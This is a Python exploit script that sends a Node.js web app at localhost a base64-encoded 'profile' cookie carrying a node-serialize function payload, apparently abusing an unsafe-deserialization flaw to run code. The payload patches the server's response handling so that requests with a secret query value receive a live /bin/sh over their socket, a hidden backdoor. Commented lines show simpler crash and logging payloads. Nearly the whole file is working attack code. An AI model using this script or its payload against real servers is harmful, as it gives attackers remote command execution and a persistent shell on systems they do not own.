import requests
import re
import base64
import sys

url = 'http://localhost:3000/'

payload = ("require('http').ServerResponse.prototype.end = (function (end) {"
"return function () {"
  "if(this.socket._httpMessage.req.query.q==='abc123'){"
     "['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket));"
     "console.log('still inside');"

     "var cp = require('child_process');"
     "var net = require('net');"
     "var sh = cp.spawn('/bin/sh');"
     "sh.stdout.pipe(this.socket);"
     "sh.stderr.pipe(this.socket);"
     "this.socket.pipe(sh.stdin);"

  "} else {"
     "console.log('now otuside');"
    "end.apply(this, arguments);"
  "}"
"}"
"})(require('http').ServerResponse.prototype.end)")



#rce = "_$$ND_FUNC$$_process.exit(0)"
#code ="_$$ND_FUNC$$_console.log('behind you')"
code = "_$$ND_FUNC$$_" + payload

string = '{"username":"admin", '
string += ' "country":"Idk Probably Somewhere Dumb", '
string += ' "city":"Lametown", '
string += ' "num": "1", ' 
string += ' "exec": "'+code+'" } '

cookie = {'profile':base64.b64encode(string)}

try:
    response = requests.get(url, cookies=cookie).text
    print response
except requests.exceptions.RequestException as e:    
    print('Oops!')
    sys.exit(1)

